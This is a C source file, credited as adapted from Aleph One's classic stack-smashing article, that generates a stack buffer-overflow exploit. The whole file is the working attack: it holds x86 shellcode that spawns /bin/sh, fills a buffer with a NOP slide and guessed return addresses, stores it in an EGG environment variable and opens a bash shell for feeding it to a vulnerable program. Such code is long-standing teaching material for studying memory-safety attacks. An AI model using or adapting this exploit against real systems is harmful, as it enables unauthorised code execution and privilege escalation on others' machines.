/*
 * Credits:
 *
 * Adapted from "Smaching the stack for fun and profit" - Aleph One
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

static char shellcode[] =
  "\xeb\x10\x5b\x31\xc0\x88\x43\x07"
  "\x89\xc2\x50\x53\x89\xe1\xb0\x0b"
  "\xcd\x80\xe8\xeb\xff\xff\xff"
  "/bin/shJ";

unsigned long get_sp(void)
{
  __asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);
  buff = (char *)malloc(bsize);

  addr = get_sp() - offset;
  fprintf(stderr, "Using address: %p\n", (void *)addr);

  ptr = buff;
  addr_ptr = (long *)ptr;

  // Fill the buffer with the return address
  for (i = 0; i < bsize; i += 4) {
    *(addr_ptr++) = addr;
  }

  // Now, fill the first half with a NOP slide
  for (i = 0; i < bsize / 2; i++) {
    buff[i] = NOP;
  }

  ptr = buff + ((bsize / 2) - (strlen(shellcode) / 2));
  for (i = 0; i < strlen(shellcode); i++) {
    *(ptr++) = shellcode[i];
  }

  buff[bsize - 1] = '\0';

  memcpy(buff, "EGG=", 4);
  putenv(buff);
  system("/bin/bash");

  return 0;
}

